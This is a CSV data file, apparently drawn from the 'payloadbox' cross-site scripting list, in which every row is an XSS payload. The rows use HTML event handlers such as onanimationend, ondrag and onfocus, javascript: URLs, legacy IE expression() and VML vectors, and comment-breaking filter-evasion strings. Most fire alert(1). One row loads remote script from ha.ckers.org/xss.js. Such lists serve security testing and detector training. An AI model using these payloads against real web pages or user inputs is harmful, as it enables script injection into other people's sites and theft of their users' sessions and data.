text,source
"<div id=""29""><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[""'`-->]]>]</div><div id=""30""><style>@import ""data:,*%7bx:expression(alert(30))%7D"";</style>//[""'`-->]]>]</div><div id=""31""><frameset onload=alert(31)>//[""'`-->]]>]</div><div id=""32""><table background=""javascript:alert(32)""></table>//[""'`-->]]>]</div><div id=""33""><a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""alert(33);"">XXX</a></a><a href=""javascript:alert(2)"">XXX</a>//[""'`-->]]>]</div><div id=""34"">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[""'`-->]]>]</div><div id=""35"">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[""'`-->]]>]</div><div id=""36""><a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(36)"">XXX</a>//[""'`-->]]>]</div><div id=""37""><!--<img src=""--><img src=x onerror=alert(37)//"">//[""'`-->]]>]</div><div id=""38""><comment><img src=""</comment><img src=x onerror=alert(38)//"">//[""'`-->]]>]</div>",payloadbox
"<style>:target {color: red;}</style><figcaption id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></figcaption>",payloadbox
"<optgroup onmouseout=""alert(1)"">test</optgroup>",payloadbox
<svg><strike onload=alert(1)></strike>,payloadbox
"<script draggable=""true"" ondragend=""alert(1)"">test</script>",payloadbox
"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></textarea>",payloadbox
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></u>",payloadbox
"<image onkeypress=""alert(1)"" contenteditable>test</image>",payloadbox
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,payloadbox
<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,payloadbox
<marquee onstart=alert(1)>,payloadbox
"<main onmouseenter=""alert(1)"">test</main>",payloadbox
"<source onmouseup=""alert(1)"">test</source>",payloadbox
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",payloadbox
"<tr ondblclick=""alert(1)"">test</tr>",payloadbox
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",payloadbox
"<plaintext onkeypress=""alert(1)"" contenteditable>test</plaintext>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",payloadbox
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",payloadbox
"<style>:target {color: red;}</style><mark id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></mark>",payloadbox
"<i draggable=""true"" ondragenter=""alert(1)"">test</i>",payloadbox
"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",payloadbox
"<article onkeydown=""alert(1)"" contenteditable>test</article>",payloadbox
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",payloadbox
<a id=x tabindex=1 onactivate=alert(1)></a>,payloadbox
"<s draggable=""true"" ondragend=""alert(1)"">test</s>",payloadbox
"<big onkeydown=""alert(1)"" contenteditable>test</big>",payloadbox
"<meta draggable=""true"" ondrag=""alert(1)"">test</meta>",payloadbox
<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>,payloadbox
<body onpopstate=alert(1)>,payloadbox
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,payloadbox
"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></table>",payloadbox
"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>",payloadbox
"<p oncut=""alert(1)"" contenteditable>test</p>",payloadbox
"<object onmouseout=""alert(1)"">test</object>",payloadbox
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,payloadbox
"<ul onmouseover=""alert(1)"">test</ul>",payloadbox
"<ins onmouseout=""alert(1)"">test</ins>",payloadbox
"<multicol onkeypress=""alert(1)"" contenteditable>test</multicol>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",payloadbox
<input id=x tabindex=1 onbeforeactivate=alert(1)></input>,payloadbox
"<b onmousedown=""alert(1)"">test</b>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",payloadbox
<var id=x tabindex=1 onactivate=alert(1)></var>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sup>",payloadbox
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",payloadbox
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",payloadbox
"<script onmouseout=""alert(1)"">test</script>",payloadbox
<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>,payloadbox
